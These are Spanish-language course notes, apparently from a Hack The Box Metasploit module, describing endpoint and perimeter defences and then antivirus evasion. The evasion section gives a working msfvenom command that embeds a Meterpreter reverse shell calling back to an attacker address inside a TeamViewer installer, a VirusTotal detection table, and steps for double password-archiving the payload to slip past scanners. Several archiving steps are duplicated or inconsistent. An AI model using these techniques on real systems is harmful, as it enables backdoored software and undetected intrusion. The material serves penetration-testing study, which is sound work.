Para aprender mejor cómo podemos atacar de manera eficiente y silenciosa a un objetivo, primero debemos comprender mejor cómo se defiende ese objetivo. Se nos presentan dos nuevos términos:
- Endpoint protection
- Perimeter protection

## Endpoint Protection
`Endpoint protection`se refiere a cualquier dispositivo o servicio localizado cuyo único propósito es proteger un único host en la red. El host puede ser una computadora personal, una estación de trabajo corporativa o un servidor en la Zona Desmilitarizada de una red ( `DMZ`).

La protección de terminales generalmente viene en forma de paquetes de software que incluyen `Antivirus Protection`, `Antimalware Protection` (esto incluye bloatware, spyware, adware, scareware, ransomware), `Firewall`, y `Anti-DDOS`todo en uno, bajo el mismo paquete de software. Estamos más familiarizados con esta forma que con la última, ya que la mayoría de nosotros ejecutamos software de protección de terminales en nuestras PC en casa o en las estaciones de trabajo de nuestro lugar de trabajo. Avast, Nod32, Malwarebytes y BitDefender son sólo algunos de los nombres actuales.

#### Perimetral Protection
`Perimeter protection`Por lo general, viene en dispositivos físicos o virtualizados en el borde del perímetro de la red. Estos `edge devices` ellos mismos proporcionan acceso `inside` de la red desde el `outside`, en otros términos, de `public` a `private`.

Entre estas dos zonas, en algunas ocasiones, también encontraremos una tercera, denominada Zona Desmilitarizada ( `DMZ`), que fue mencionado anteriormente. Esto es un `lower-security policy level` zona que la `inside networks'` uno, pero con un mayor `trust level` que la `outside zone`, que es la vasta Internet. Este es el espacio virtual donde se alojan los servidores públicos, que envían y extraen datos de Internet para clientes públicos, pero que también se administran desde adentro y se actualizan con parches, información y otros datos para mantener la información servida actualizada y actualizada. satisfacer a los clientes de los servidores.

## Políticas de seguridad
Las políticas de seguridad son el motor detrás de cada postura de seguridad bien mantenida de cualquier red. Funcionan de la misma manera que lo hacen las ACL (listas de control de acceso) para cualquier persona familiarizada con el material educativo de Cisco CCNA. Son esencialmente una lista de `allow` y `deny`declaraciones que dictan cómo el tráfico o los archivos pueden existir dentro de los límites de una red. Varias listas pueden actuar sobre múltiples partes de la red, lo que permite flexibilidad dentro de una configuración. Estas listas también pueden apuntar a diferentes características de la red y los hosts, dependiendo de dónde residan:

- Políticas de tráfico de red
- Políticas de aplicación
- Políticas de control de acceso de usuarios
- Políticas de gestión de archivos
- Políticas de protección DDoS
- Otros

Si bien no todas estas categorías anteriores pueden tener las palabras "Política de seguridad" adjuntas, todos los mecanismos de seguridad que las rodean operan según el mismo principio básico, el `allow` y `deny`entradas. La única diferencia es el objeto objetivo al que se refieren y al que se aplican. Entonces la pregunta sigue siendo: ¿cómo hacemos coincidir los eventos en la red con estas reglas para que se puedan tomar las acciones mencionadas anteriormente?

Hay varias formas de hacer coincidir un evento u objeto con una entrada de política de seguridad:

|**Politica de seguridad**|**Descripción**|
|---|---|
|`Signature-based Detection`|La operación de paquetes en la red y comparación con patrones de ataque prediseñados y predeterminados conocidos como firmas. Cualquier coincidencia del 100% con estas firmas generará alarmas.|
|`Heuristic / Statistical Anomaly Detection`|La comparación de comportamiento con una línea de base establecida incluyó firmas de modus operandi para APT (amenazas persistentes avanzadas) conocidas. La línea de base identificará la norma para la red y qué protocolos se utilizan comúnmente. Cualquier desviación del umbral máximo generará alarmas.|
|`Stateful Protocol Analysis Detection`|Reconocer la divergencia de protocolos establecidos mediante la comparación de eventos utilizando perfiles prediseñados de definiciones generalmente aceptadas de actividad no maliciosa.|
|`Live-monitoring and Alerting (SOC-based)`|Un equipo de analistas en un SOC (Centro de Operaciones de Seguridad) dedicado, interno o alquilado utiliza software de transmisión en vivo para monitorear la actividad de la red y sistemas de alarma intermedios para cualquier amenaza potencial, ya sea decidiendo por sí mismos si se debe actuar sobre la amenaza o permitiendo en cambio, los mecanismos automatizados actúan.|
## Técnicas de evasión
La mayoría del software antivirus basado en host hoy en día se basa principalmente en `Signature-based Detection`para identificar aspectos de código malicioso presentes en una muestra de software. Estas firmas se colocan dentro del motor antivirus, donde posteriormente se utilizan para escanear el espacio de almacenamiento y los procesos en ejecución en busca de coincidencias. Cuando un software desconocido llega a una partición y el software antivirus lo compara, la mayoría de los antivirus ponen en cuarentena el programa malicioso y finalizan el proceso en ejecución.

¿Cómo evitamos todo este calor? Jugamos con ello. Los ejemplos mostrados en el `Encoders`La sección muestra que simplemente codificar cargas útiles usando diferentes esquemas de codificación con múltiples iteraciones no es suficiente para todos los productos AV. Además, el simple hecho de establecer un canal de comunicación entre el atacante y la víctima puede generar algunas alarmas con las capacidades actuales de los productos IDS/IPS que existen.

Sin embargo, con la versión MSF6, msfconsole puede canalizar la comunicación cifrada con AES desde cualquier shell de Meterpreter hasta el host del atacante, cifrando con éxito el tráfico a medida que la carga útil se envía al host de la víctima. Esto se ocupa principalmente del IDS/IPS basado en red. En algunos casos raros, es posible que nos encontremos con conjuntos de reglas de tráfico muy estrictas que marcan nuestra conexión en función de la dirección IP del remitente. La única forma de evitar esto es encontrar los servicios que se permiten. Un excelente ejemplo de esto sería el hackeo de Equifax de 2017, donde piratas informáticos malintencionados abusaron de la vulnerabilidad de Apache Struts para acceder a una red de servidores de datos críticos. Se utilizaron técnicas de exfiltración de DNS para desviar lentamente datos de la red al dominio de los piratas informáticos sin que nadie se diera cuenta durante meses.

Volviendo a msfconsole, su capacidad para soportar ahora túneles cifrados con AES, junto con la característica de Meterpreter de ejecutarse en memoria, aumenta nuestra capacidad por un margen. Sin embargo, todavía tenemos el problema de qué sucede con una carga útil una vez que llega a su destino, antes de ejecutarla y colocarla en la memoria. A este archivo se le podrían tomar huellas digitales para su firma, compararlo con la base de datos y bloquearlo, junto con nuestras posibilidades de acceder al objetivo. También podemos estar seguros de que los desarrolladores de software AV están buscando módulos y capacidades de msfconsole para agregar el código y los archivos resultantes a su base de datos de firmas, lo que resulta en que la mayoría, si no todas, las cargas útiles predeterminadas sean cerradas inmediatamente por el software AV hoy en día.

Estamos de suerte porque `msfvenom`ofrece la opción de utilizar plantillas ejecutables. Esto nos permite usar algunas plantillas preestablecidas para archivos ejecutables, inyectarles nuestra carga útil (sin juego de palabras) y usar `any`ejecutable como plataforma desde la que lanzar nuestro ataque. Podemos incrustar el código shell en cualquier instalador, paquete o programa que tengamos a mano, ocultando el código shell de carga útil en lo más profundo del código legítimo del producto real. Esto confunde enormemente nuestro código malicioso y, lo que es más importante, reduce nuestras posibilidades de detección. Existen muchas combinaciones válidas entre archivos ejecutables reales y legítimos, nuestros diferentes esquemas de codificación (y sus iteraciones) y nuestras diferentes variantes de shellcode de carga útil. Esto genera lo que se llama un ejecutable con puerta trasera.

```js
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

En su mayor parte, cuando un objetivo lanza un ejecutable con puerta trasera, no parece suceder nada, lo que puede generar sospechas en algunos casos. Para mejorar nuestras posibilidades, debemos activar la continuación de la ejecución normal de la aplicación iniciada mientras extraemos la carga útil en un hilo separado de la aplicación principal. Lo hacemos con el `-k`bandera como aparece arriba. Sin embargo, incluso con la `-k`flag en ejecución, el objetivo solo notará la puerta trasera en ejecución si inicia la plantilla ejecutable con puerta trasera desde un entorno CLI. Si lo hacen, aparecerá una ventana separada con la carga útil, que no se cerrará hasta que terminemos de ejecutar la interacción de la sesión de carga útil en el objetivo.

## Archivo

Archivar información como un archivo, carpeta, secuencia de comandos, ejecutable, imagen o documento y colocar una contraseña en el archivo evita muchas firmas antivirus comunes en la actualidad. Sin embargo, la desventaja de este proceso es que aparecerán como notificaciones en el panel de alarma AV porque no se pueden escanear debido a que están bloqueados con una contraseña. Un administrador puede optar por inspeccionar manualmente estos archivos para determinar si son maliciosos o no.

```js
p314d0@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js
```

Si comparamos con VirusTotal para obtener una línea base de detección a partir de la carga útil que generamos, los resultados serán los siguientes.
```js
p314d0@htb[/htb]$ msf-virustotal -k <API key> -f test.js 

[*] WARNING: When you upload or otherwise submit content, you give VirusTotal
[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable
[*] licence to use, edit, host, store, reproduce, modify, create derivative works,
[*] communicate, publish, publicly perform, publicly display and distribute such
[*] content. To read the complete Terms of Service for VirusTotal, please go to the
[*] following link:
[*] https://www.virustotal.com/en/about/terms-of-service/
[*] 
[*] If you prefer your own API key, you may obtain one at VirusTotal.

[*] Enter 'Y' to acknowledge: Y


[*] Using API key: <API key>
[*] Please wait while I upload test.js...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167047
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Analysis Report: test.js (11 / 59): <...SNIP...>
====================================================================================================

 Antivirus             Detected  Version               Result                             Update
 ---------             --------  -------               ------                             ------
 ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510
 AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Acronis               false     1.2.0.108                                                20220426
 Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510
 AhnLab-V3             false     3.21.3.10230                                             20220510
 Antiy-AVL             false     3.0                                                      20220510
 Arcabit               false     1.0.0.889                                                20220510
 Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Avira                 false     8.3.3.14                                                 20220510
 Baidu                 false     1.0.0.2                                                  20190318
 BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510
 BitDefenderTheta      false     7.2.37796.0                                              20220428
 Bkav                  false     1.3.0.9899                                               20220509
 CAT-QuickHeal         false     14.00                                                    20220510
 CMC                   false     2.10.2019.1                                              20211026
 ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509
 Comodo                false     34607                                                    20220510
 Cynet                 false     4.0.0.27                                                 20220510
 Cyren                 false     6.5.1.2                                                  20220510
 DrWeb                 false     7.0.56.4040                                              20220510
 ESET-NOD32            false     25243                                                    20220510
 Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510
 F-Secure              false     18.10.978.51                                             20220510
 FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510
 Fortinet              false     6.2.142.0                                                20220510
 GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510
 Gridinsoft            false     1.0.77.174                                               20220510
 Ikarus                false     6.0.24.0                                                 20220509
 Jiangmin              false     16.0.100                                                 20220509
 K7AntiVirus           false     12.12.42275                                              20220510
 K7GW                  false     12.12.42275                                              20220510
 Kaspersky             false     21.0.1.45                                                20220510
 Kingsoft              false     2017.9.26.565                                            20220510
 Lionic                false     7.5                                                      20220510
 MAX                   true      2019.9.16.1           malware (ai score=89)              20220510
 Malwarebytes          false     4.2.2.27                                                 20220510
 MaxSecure             false     1.0.0.1                                                  20220510
 McAfee                false     6.0.6.653                                                20220510
 McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510
 MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510
 Microsoft             false     1.1.19200.5                                              20220510
 NANO-Antivirus        false     1.0.146.25588                                            20220510
 Panda                 false     4.6.4.2                                                  20220509
 Rising                false     25.0.0.27                                                20220510
 SUPERAntiSpyware      false     5.6.0.1032                                               20220507
 Sangfor               false     2.14.0.0                                                 20220507
 Sophos                false     1.4.1.0                                                  20220510
 Symantec              false     1.17.0.0                                                 20220510
 TACHYON               false     2022-05-10.02                                            20220510
 Tencent               false     1.0.0.1                                                  20220510
 TrendMicro            false     11.0.0.1006                                              20220510
 TrendMicro-HouseCall  false     10.0.0.1040                                              20220510
 VBA32                 false     5.0.0                                                    20220506
 ViRobot               false     2014.3.20.0                                              20220510
 VirIT                 false     9.5.191                                                  20220509
 Yandex                false     5.5.2.24                                                 20220428
 Zillya                false     2.0.0.4627                                               20220509
 ZoneAlarm             false     1.0                                                      20220510
 Zoner                 false     2.2.2.0    
```

Ahora, intenta archivarlo dos veces, asignando una contraseña a ambos archivos al crearlos y eliminando el `.rar`/ `.zip`/ `.7z`extensión de sus nombres. Para ello podemos instalar la [utilidad RAR](https://www.rarlab.com/download.htm) de RARLabs, que funciona exactamente como WinRAR en Windows.

#### Archivar la carga útil

```js
p314d0@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
p314d0@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
p314d0@htb[/htb]$ rar a ~/test.rar -p ~/test.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK 
Done
```

```js
p314d0@htb[/htb]$ ls

test.js   test.rar
```

#### Eliminación de la extensión .RAR
```js
p314d0@htb[/htb]$ mv test.rar test
p314d0@htb[/htb]$ ls

test   test.js
```

#### Archivar la carga útil nuevamente
```js
p314d0@htb[/htb]$ rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```

#### Eliminación de la extensión .RAR
```js
p314d0@htb[/htb]$ mv test.rar test
p314d0@htb[/htb]$ ls

test   test.js
```
#### Eliminación de la extensión .RAR
```js
p314d0@htb[/htb]$ mv test2.rar test2
p314d0@htb[/htb]$ ls

test   test2   test.js
```

#### Archivar la carga útil nuevamente
```js
p314d0@htb[/htb]$ rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```

#### Eliminación de la extensión .RAR
```js
p314d0@htb[/htb]$ mv test2.rar test2
p314d0@htb[/htb]$ ls

test   test2   test.js
```

El archivo test2 es el archivo .rar final con la extensión (.rar) eliminada del nombre. Después de eso, podemos proceder a cargarlo en VirusTotal para realizar otra verificación.

![[Pasted image 20240625055845.png]]

